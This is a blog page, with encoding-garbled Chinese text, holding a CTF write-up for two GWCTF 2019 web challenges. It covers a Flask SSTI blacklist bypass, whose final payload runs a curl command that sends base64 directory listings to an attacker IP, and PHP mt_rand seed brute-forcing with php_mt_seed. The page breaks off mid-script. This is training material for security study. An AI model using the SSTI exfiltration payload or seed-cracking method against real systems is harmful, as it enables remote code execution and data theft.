<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ä¹‹å‰å¹¿å¤–CTFçš„æ—¶å€™æ‰åˆšåˆšæ¥è§¦CTFï¼Œå½“æ—¶åªåšäº†ä¸€é“éšæœºæ•°çˆ†ç ´ï¼Œç°åœ¨æ¥å¤ç°
 ä½ çš„åå­— è€ƒç‚¹ï¼šflaskSSTIã€ç»•è¿‡{{}}è¿‡æ»¤ã€é»‘åå•è¿‡æ»¤é€»è¾‘é”™è¯¯
å¾ˆè¯¦ç»†çš„SSTI&amp;raquo;ï¼šhttps://xz.aliyun.com/t/6885#toc-4
SSTIbypasså§¿åŠ¿&amp;raquo;https://p0sec.net/index.php/archives/120/
å‚è€ƒï¼š&amp;raquo;ggb0n
æ‰“å¼€é¢˜ç›®ï¼Œåªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè”æƒ³åˆ°æ³¨å…¥ï¼Œä¸è¿‡SQLiå°è¯•ä¹‹åå‘ç°å¹¶ä¸è¡Œï¼Œäºæ˜¯å°±å»å°è¯•SSTIï¼Œä¸è¿‡ç½‘ä¸Šçš„wpè¯´å¯ä»¥é€šè¿‡æŠ“åŒ…æŸ¥çœ‹å“åº”å¤´æ¥åˆ¤æ–­æœåŠ¡å™¨ä½¿ç”¨çš„pythonçš„æ¨¡æ¿ã€‚
å°è¯•è¾“å…¥{{2*2}}ï¼Œè¿”å›â€œParse error: syntax error, unexpected T_STRING, expecting &amp;lsquo;{&amp;rsquo; in \var\WWW\html\test.php on line 13 â€
ä¸ç®¡æ€ä¹ˆæ”¹ï¼Œè¿”å›çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¯´æ˜å¯èƒ½{{}}è¢«è¿‡æ»¤äº†ï¼›
ä½†æ˜¯å¯ä»¥é€šè¿‡ {%%} ç±»ä¼¼çš„æ–¹å¼æ¥è¿›è¡Œæ³¨å…¥ï¼Œå°è¯• {%if 1%}1{% endif%} ï¼Œå‘ç°æœåŠ¡å™¨ç›´æ¥ç»™å‡º500é”™è¯¯ã€‚ã€‚ã€‚åˆ¤æ–­å¯èƒ½æœ‰ä»€ä¹ˆè¿‡æ»¤
ç›´æ¥è¾“å…¥ifï¼Œè¿”å›ç»“æœæ˜¯ï¼š
hello !è¯´æ˜ifè¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå°è¯•åŒå†™iiffï¼Œä½†æ˜¯è¿˜æ˜¯è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå¯èƒ½æ˜¯ç”¨çš„å¾ªç¯åŒ¹é…ã€‚
å‚è€ƒäº†å¸ˆå‚…å†™çš„wpï¼Œfuzzå‡ºæ¥çš„è¿‡æ»¤å¯èƒ½æ˜¯è¿™ä¸ªæ ·å­ï¼š
blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,&#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,&#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]for no in blacklist:while True:if no in s:s = s.'><title>GWCTF 2019 å¤ç°</title>

<link rel='canonical' href='https://example.com/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='GWCTF 2019 å¤ç°'>
<meta property='og:description' content='ä¹‹å‰å¹¿å¤–CTFçš„æ—¶å€™æ‰åˆšåˆšæ¥è§¦CTFï¼Œå½“æ—¶åªåšäº†ä¸€é“éšæœºæ•°çˆ†ç ´ï¼Œç°åœ¨æ¥å¤ç°
 ä½ çš„åå­— è€ƒç‚¹ï¼šflaskSSTIã€ç»•è¿‡{{}}è¿‡æ»¤ã€é»‘åå•è¿‡æ»¤é€»è¾‘é”™è¯¯
å¾ˆè¯¦ç»†çš„SSTI&amp;raquo;ï¼šhttps://xz.aliyun.com/t/6885#toc-4
SSTIbypasså§¿åŠ¿&amp;raquo;https://p0sec.net/index.php/archives/120/
å‚è€ƒï¼š&amp;raquo;ggb0n
æ‰“å¼€é¢˜ç›®ï¼Œåªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè”æƒ³åˆ°æ³¨å…¥ï¼Œä¸è¿‡SQLiå°è¯•ä¹‹åå‘ç°å¹¶ä¸è¡Œï¼Œäºæ˜¯å°±å»å°è¯•SSTIï¼Œä¸è¿‡ç½‘ä¸Šçš„wpè¯´å¯ä»¥é€šè¿‡æŠ“åŒ…æŸ¥çœ‹å“åº”å¤´æ¥åˆ¤æ–­æœåŠ¡å™¨ä½¿ç”¨çš„pythonçš„æ¨¡æ¿ã€‚
å°è¯•è¾“å…¥{{2*2}}ï¼Œè¿”å›â€œParse error: syntax error, unexpected T_STRING, expecting &amp;lsquo;{&amp;rsquo; in \var\WWW\html\test.php on line 13 â€
ä¸ç®¡æ€ä¹ˆæ”¹ï¼Œè¿”å›çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¯´æ˜å¯èƒ½{{}}è¢«è¿‡æ»¤äº†ï¼›
ä½†æ˜¯å¯ä»¥é€šè¿‡ {%%} ç±»ä¼¼çš„æ–¹å¼æ¥è¿›è¡Œæ³¨å…¥ï¼Œå°è¯• {%if 1%}1{% endif%} ï¼Œå‘ç°æœåŠ¡å™¨ç›´æ¥ç»™å‡º500é”™è¯¯ã€‚ã€‚ã€‚åˆ¤æ–­å¯èƒ½æœ‰ä»€ä¹ˆè¿‡æ»¤
ç›´æ¥è¾“å…¥ifï¼Œè¿”å›ç»“æœæ˜¯ï¼š
hello !è¯´æ˜ifè¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå°è¯•åŒå†™iiffï¼Œä½†æ˜¯è¿˜æ˜¯è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå¯èƒ½æ˜¯ç”¨çš„å¾ªç¯åŒ¹é…ã€‚
å‚è€ƒäº†å¸ˆå‚…å†™çš„wpï¼Œfuzzå‡ºæ¥çš„è¿‡æ»¤å¯èƒ½æ˜¯è¿™ä¸ªæ ·å­ï¼š
blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,&#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,&#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]for no in blacklist:while True:if no in s:s = s.'>
<meta property='og:url' content='https://example.com/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/'>
<meta property='og:site_name' content='wh1sper'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' />
<meta name="twitter:title" content="GWCTF 2019 å¤ç°">
<meta name="twitter:description" content="ä¹‹å‰å¹¿å¤–CTFçš„æ—¶å€™æ‰åˆšåˆšæ¥è§¦CTFï¼Œå½“æ—¶åªåšäº†ä¸€é“éšæœºæ•°çˆ†ç ´ï¼Œç°åœ¨æ¥å¤ç°
 ä½ çš„åå­— è€ƒç‚¹ï¼šflaskSSTIã€ç»•è¿‡{{}}è¿‡æ»¤ã€é»‘åå•è¿‡æ»¤é€»è¾‘é”™è¯¯
å¾ˆè¯¦ç»†çš„SSTI&amp;raquo;ï¼šhttps://xz.aliyun.com/t/6885#toc-4
SSTIbypasså§¿åŠ¿&amp;raquo;https://p0sec.net/index.php/archives/120/
å‚è€ƒï¼š&amp;raquo;ggb0n
æ‰“å¼€é¢˜ç›®ï¼Œåªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè”æƒ³åˆ°æ³¨å…¥ï¼Œä¸è¿‡SQLiå°è¯•ä¹‹åå‘ç°å¹¶ä¸è¡Œï¼Œäºæ˜¯å°±å»å°è¯•SSTIï¼Œä¸è¿‡ç½‘ä¸Šçš„wpè¯´å¯ä»¥é€šè¿‡æŠ“åŒ…æŸ¥çœ‹å“åº”å¤´æ¥åˆ¤æ–­æœåŠ¡å™¨ä½¿ç”¨çš„pythonçš„æ¨¡æ¿ã€‚
å°è¯•è¾“å…¥{{2*2}}ï¼Œè¿”å›â€œParse error: syntax error, unexpected T_STRING, expecting &amp;lsquo;{&amp;rsquo; in \var\WWW\html\test.php on line 13 â€
ä¸ç®¡æ€ä¹ˆæ”¹ï¼Œè¿”å›çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¯´æ˜å¯èƒ½{{}}è¢«è¿‡æ»¤äº†ï¼›
ä½†æ˜¯å¯ä»¥é€šè¿‡ {%%} ç±»ä¼¼çš„æ–¹å¼æ¥è¿›è¡Œæ³¨å…¥ï¼Œå°è¯• {%if 1%}1{% endif%} ï¼Œå‘ç°æœåŠ¡å™¨ç›´æ¥ç»™å‡º500é”™è¯¯ã€‚ã€‚ã€‚åˆ¤æ–­å¯èƒ½æœ‰ä»€ä¹ˆè¿‡æ»¤
ç›´æ¥è¾“å…¥ifï¼Œè¿”å›ç»“æœæ˜¯ï¼š
hello !è¯´æ˜ifè¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå°è¯•åŒå†™iiffï¼Œä½†æ˜¯è¿˜æ˜¯è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå¯èƒ½æ˜¯ç”¨çš„å¾ªç¯åŒ¹é…ã€‚
å‚è€ƒäº†å¸ˆå‚…å†™çš„wpï¼Œfuzzå‡ºæ¥çš„è¿‡æ»¤å¯èƒ½æ˜¯è¿™ä¸ªæ ·å­ï¼š
blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,&#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,&#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]for no in blacklist:while True:if no in s:s = s.">
    </head>
    <body class="">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.body.dataset.scheme = 'dark';
        } else {
            document.body.dataset.scheme = 'light';
        }
    })();
</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
            <aside class="sidebar left-sidebar sticky">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header class="site-info">
        
            <figure class="site-avatar">
                
                    
                    
                    
                        
                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                

                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
        
        <h1 class="site-name"><a href="https://example.com">wh1sper</a></h1>
        <h2 class="site-description">ä¸“æ³¨Webå®‰å…¨</h2>
    </header>

    <ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/about'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        
            <li id="dark-mode-toggle">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <span>Dark Mode</span>
            </li>
        
    </ol>
</aside>

            <main class="main full-width">
    <div id="article-toolbar">
        <a href="https://example.com" class="back-home">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



            <span>Back</span>
        </a>
    </div>

    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    

    <h2 class="article-title">
        <a href="/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/">GWCTF 2019 å¤ç°</a>
    </h2>

    </div>
</header>

    <section class="article-content">
    <p>ä¹‹å‰å¹¿å¤–CTFçš„æ—¶å€™æ‰åˆšåˆšæ¥è§¦CTFï¼Œå½“æ—¶åªåšäº†ä¸€é“éšæœºæ•°çˆ†ç ´ï¼Œç°åœ¨æ¥å¤ç°</p>
<hr>
<h3 id="ä½ çš„åå­—httpsbuuojcnchallengesgwctf202019ä½ çš„åå­—"><a class="link" href="https://buuoj.cn/challenges#[GWCTF%202019]%e4%bd%a0%e7%9a%84%e5%90%8d%e5%ad%97"  target="_blank" rel="noopener"
    >ä½ çš„åå­—</a></h3>
<p>è€ƒç‚¹ï¼šflaskSSTIã€ç»•è¿‡<code>{{}}</code>è¿‡æ»¤ã€é»‘åå•è¿‡æ»¤é€»è¾‘é”™è¯¯</p>
<p>å¾ˆè¯¦ç»†çš„SSTI&raquo;ï¼šhttps://xz.aliyun.com/t/6885#toc-4</p>
<p>SSTIbypasså§¿åŠ¿&raquo;<a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
<p>å‚è€ƒï¼š&raquo;<a class="link" href="http://ggb0n.cool/2020/03/04/GWCTF2019%e5%a4%8d%e7%8e%b0/"  target="_blank" rel="noopener"
    >ggb0n</a></p>
<p>æ‰“å¼€é¢˜ç›®ï¼Œåªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè”æƒ³åˆ°æ³¨å…¥ï¼Œä¸è¿‡SQLiå°è¯•ä¹‹åå‘ç°å¹¶ä¸è¡Œï¼Œäºæ˜¯å°±å»å°è¯•SSTIï¼Œä¸è¿‡ç½‘ä¸Šçš„wpè¯´å¯ä»¥é€šè¿‡æŠ“åŒ…æŸ¥çœ‹å“åº”å¤´æ¥åˆ¤æ–­æœåŠ¡å™¨ä½¿ç”¨çš„pythonçš„æ¨¡æ¿ã€‚</p>
<p>å°è¯•è¾“å…¥{{2*2}}ï¼Œè¿”å›â€œParse error: syntax error, unexpected T_STRING, expecting &lsquo;{&rsquo; in \var\WWW\html\test.php on line 13 â€</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170318.png" alt="img"  /></p>
<p>ä¸ç®¡æ€ä¹ˆæ”¹ï¼Œè¿”å›çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¯´æ˜å¯èƒ½{{}}è¢«è¿‡æ»¤äº†ï¼›</p>
<p>ä½†æ˜¯å¯ä»¥é€šè¿‡ <code>{%%}</code> ç±»ä¼¼çš„æ–¹å¼æ¥è¿›è¡Œæ³¨å…¥ï¼Œå°è¯• <code>{%if 1%}1{% endif%}</code> ï¼Œå‘ç°æœåŠ¡å™¨ç›´æ¥ç»™å‡º500é”™è¯¯ã€‚ã€‚ã€‚åˆ¤æ–­å¯èƒ½æœ‰ä»€ä¹ˆè¿‡æ»¤</p>
<p>ç›´æ¥è¾“å…¥ifï¼Œè¿”å›ç»“æœæ˜¯ï¼š</p>
<pre><code>hello !
</code></pre><p>è¯´æ˜ifè¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå°è¯•åŒå†™iiffï¼Œä½†æ˜¯è¿˜æ˜¯è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå¯èƒ½æ˜¯ç”¨çš„å¾ªç¯åŒ¹é…ã€‚</p>
<p>å‚è€ƒäº†å¸ˆå‚…å†™çš„wpï¼Œfuzzå‡ºæ¥çš„è¿‡æ»¤å¯èƒ½æ˜¯è¿™ä¸ªæ ·å­ï¼š</p>
<pre><code>blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval',
                 'if', 'for',' subprocess', 'file', 'open', 'popen', 'builtins', 'compile',
                 'execfile', 'from_pyfile', 'local','self', 'item', 'getitem', 'getattribute', 
                 'func_globals', 'config']
for no in blacklist:
    while True:
        if no in s:
            s = s.replace(no, '')
        else:
            break
return s
</code></pre><p>è€ƒå¯Ÿé»‘åå•è¿‡æ»¤é€»è¾‘é”™è¯¯ï¼Œè¿™ç§è¿‡æ»¤ï¼Œåˆ©ç”¨é»‘åå•ä¸­æœ€åä¸€ä¸ªè¯è¿›è¡Œæ··æ·†æ¥è¿‡æ»¤æ˜¯æœ€å¥½äº†ï¼Œå³ <code>if=&gt;iconfigf</code> ï¼Œå› ä¸ºæ˜¯ç”¨é»‘åå•çš„å…³é”®è¯æŒ‰é¡ºåºæ¥å¯¹è¾“å…¥è¿›è¡Œæ›¿æ¢çš„ï¼Œé‚£ä¹ˆæœ€åä¸€ä¸ª <code>config</code> è¢«æ›¿æ¢ä¹‹åï¼Œè¿‡æ»¤ä¹Ÿå°±ç»“æŸäº†ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åœ¨æ‰€æœ‰è¢«è¿‡æ»¤çš„å…³é”®è¯ä¸­é—´éƒ½å¯ä»¥æ’å…¥ä¸€ä¸ªconfigæ¥é¿å¼€è¿‡æ»¤ï¼›</p>
<p>æœ€ç»ˆplaylaodï¼š</p>
<pre><code>{% iconfigf ''.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__['linecache'].oconfigs.system('curl http://174.0.225.32/?a=`ls \|base64`') %}1{% endiconfigf %}
#ç›¸å½“äºæŠŠlsçš„ç»“æœè¿›è¡Œbase64ç¼–ç åï¼ˆä¸ç„¶åªèƒ½æ˜¾ç¤ºä¸€è¡Œï¼‰ï¼Œä»¥curlçš„æ–¹å¼å‘é€åˆ°æ”»å‡»æœº
</code></pre><p>flag{a2bc941d-a38d-42bb-97be-fe2440442cdf}</p>
<h3 id="æ¯ç‡¥çš„æŠ½å¥–httpsbuuojcnchallengesgwctf202019æ¯ç‡¥çš„æŠ½å¥–"><a class="link" href="https://buuoj.cn/challenges#[GWCTF%202019]%e6%9e%af%e7%87%a5%e7%9a%84%e6%8a%bd%e5%a5%96"  target="_blank" rel="noopener"
    >æ¯ç‡¥çš„æŠ½å¥–</a></h3>
<p>è€ƒç‚¹ï¼šPHPé€†å‘è„šæœ¬ã€PHPä¼ªéšæœºæ•°çˆ†ç ´</p>
<p>æ‰“å¼€é¢˜ç›®ï¼Œå«ä½ çŒœæ•°æ®ï¼Œå¹¶ä¸”ç»™äº†å‰10ä½ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170333.png" alt="img"  /></p>
<p>éšä¾¿è¾“ä¸€ä¸ªæäº¤ï¼Œéšå³ç»™å‡ºæºç ï¼š</p>
<pre><code>&lt;?php
#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼
header(&quot;Content-Type: text/html;charset=utf-8&quot;);
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
$str='';
$len1=20;
for ( $i = 0; $i &lt; $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo &quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}&lt;/p&gt;&quot;;
    }
    else{
        echo &quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;;
    }
}
show_source(&quot;check.php&quot;);
</code></pre><p>æ„æ€å¤§æ¦‚æ˜¯ï¼š</p>
<p>ä¸€ä¸ª20æ¬¡çš„å¾ªç¯ï¼Œæ¯æ¬¡ä» <code>$str_long1</code> éšæœºå–ä¸€ä¸ªå­—ç¬¦ï¼Œæ‹¼æ¥æˆæœ€åçš„ <code>$str</code> ã€‚</p>
<ul>
<li>å½“ <code>mt_rand()</code> å‡½æ•°è¿è¡Œçš„æ—¶å€™ï¼Œä¼šæ£€æŸ¥æœ‰æ²¡æœ‰æ’­ç§ <code>mt_srand</code> å¦‚æœå·²ç»æ’­ç§äº†ï¼Œå°±ç›´æ¥å–éšæœºæ•°ï¼Œå…¶å®è¿™é‡Œå’ŒCè¯­è¨€ä¸€æ ·ï¼ˆPHPåº•å±‚æ˜¯Cï¼‰å¦‚æœä¸æ¯æ¬¡é‡æ–°æ’­ç§çš„è¯ï¼Œéšæœºæ•°æ€ä¹ˆå–éƒ½æ˜¯ä¸€æ ·çš„</li>
</ul>
<p>æˆ‘ä»¬æ¥å†™æ®µä»£ç ã€‚</p>
<pre><code>&lt;?php
mt_srand(12345);
echo mt_rand().&quot;&lt;br/&gt;&quot;;
?&gt;
</code></pre><p>æˆ‘ä»¬è®¿é—®ï¼Œè¾“å‡º <code>162946439</code> ã€‚</p>
<p>ç°åœ¨ä»£ç æ”¹ä¸º</p>
<pre><code>&lt;?php 
mt_srand(12345); 
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
?&gt;
</code></pre><p>æˆ‘ä»¬å†æ¬¡è®¿é—®:</p>
<pre><code>162946439

247161732

1463094264

1878061366

394962642
</code></pre><p>ç°åœ¨ç»†å¿ƒçš„äººå¯èƒ½å·²ç»å‘ç°ï¼Œç¬¬ä¸€ä¸ªæ•° <code>162946439</code> å­˜åœ¨çŒ«è…»äº†ã€‚</p>
<p>ä¸ºä»€ä¹ˆç”Ÿæˆéšæœºæ•°ä¼šä¸€æ ·å‘¢ï¼Ÿæˆ‘ä»¬å¤šæ¬¡è®¿é—®ã€‚éœ‡æƒŠ:
è¿˜æ˜¯</p>
<pre><code>162946439

247161732

1463094264

1878061366

394962642
</code></pre><p>å…¶å®ï¼Œè¿™å°±æ˜¯ä¼ªéšæœºæ•°çš„æ¼æ´ï¼Œå­˜åœ¨å¯é¢„æµ‹æ€§ã€‚</p>
<p>ç”Ÿæˆä¼ªéšæœºæ•°æ˜¯çº¿æ€§çš„ï¼Œä½ å¯ä»¥ç†è§£ä¸º <code>y=ax</code> , <code>x</code> å°±æ˜¯ç§å­ï¼ŒçŸ¥é“ç§å­å’Œä¸€ç»„ä¼ªéšæœºæ•°ä¸æ˜¯å°±å¯ä»¥æ¨y(ä¼ªéšæœºæ•°)äº†å—
å½“ç„¶ï¼Œå®é™…ä¸Šæ›´å¤æ‚è‚¯å®šã€‚</p>
<p>æˆ‘çŸ¥é“ç§å­åï¼Œå¯ä»¥ç¡®å®šä½ è¾“å‡ºä¼ªéšæœºæ•°çš„åºåˆ—ã€‚
çŸ¥é“ä½ çš„éšæœºæ•°åºåˆ—ï¼Œå¯ä»¥ç¡®å®šä½ çš„ç§å­ã€‚</p>
<p>ç”¨åˆ°çš„æ˜¯çˆ†ç ´ï¼Œå·²ç»æœ‰å†™å¥½çš„<a class="link" href="https://www.openwall.com/php_mt_seed/"  target="_blank" rel="noopener"
    >Cè„šæœ¬</a>äº†ã€‚</p>
<p>æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æ ¹æ®ä»–ç»™å‡ºçš„10ä¸ºæ•°æ®ï¼Œæ¥çˆ†ç ´ä»–çš„éšæœºæ•°ç§å­ï¼Œç„¶ååœ¨æŠŠå‰©ä¸‹çš„éšæœºæ•°è¾“å‡º</p>
<p>å› ä¸ºæ˜¯ç”¨çš„php_mt_seedï¼Œæˆ‘ä»¬è¦ç”¨ä»–çš„æ ¼å¼ï¼Œè¿™æ˜¯è½¬æ¢æˆéšæœºæ•°çš„è„šæœ¬</p>
<pre><code>&lt;?php
$pass_now = &quot;JAfq968Gqy&quot;;//ç»™å‡ºçš„å¯†é’¥
$allowable_characters = '
abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';//å­—æ¯è¡¨

$length = strlen($allowable_characters) - 1;

for ($j = 0; $j &lt; strlen($pass_now); $j++) {//éå†å¯†é’¥
    for ($i = 0; $i &lt; $length; $i++) {//éå†å­—æ¯è¡¨
        if ($pass_now[$j] == $allowable_characters[$i]) {
            echo &quot;$i $i 0 $length &quot;;
            break;
        }
    }
}
?&gt;
</code></pre><p>è¿è¡Œï¼Œå¾—åˆ°</p>
<pre><code>45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 34 34 0 61 42 
42 0 61 16 16 0 61 24 24 0 61
</code></pre><p>æŠŠphp_mt_seedä¸‹è½½è§£å‹ä¹‹åï¼Œè¿è¡Œå‘½ä»¤ï¼š</p>
<pre><code>make
./php_mt_seed 45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 
34 34 0 61 42 42 0 61 16 16 0 61 24 24 0 61
</code></pre><p>å¯ä»¥å¾—åˆ°ä»–çš„éšæœºæ•°ç§å­</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170347.png" alt="img"  /></p>
<p>ç„¶åæˆ‘ä»¬ç›´æ¥æŠŠä»–åŸæ¥çš„ä»£ç æ‹·è´è¿‡æ¥ï¼Œç§å­æ›¿æ¢ä¸ºæˆ‘ä»¬çˆ†ç ´å‡ºæ¥çš„ï¼š</p>
<pre><code>&lt;?php
mt_srand(591614089);
$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
$str='';
$len1=20;
for ( $i = 0; $i &lt; $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
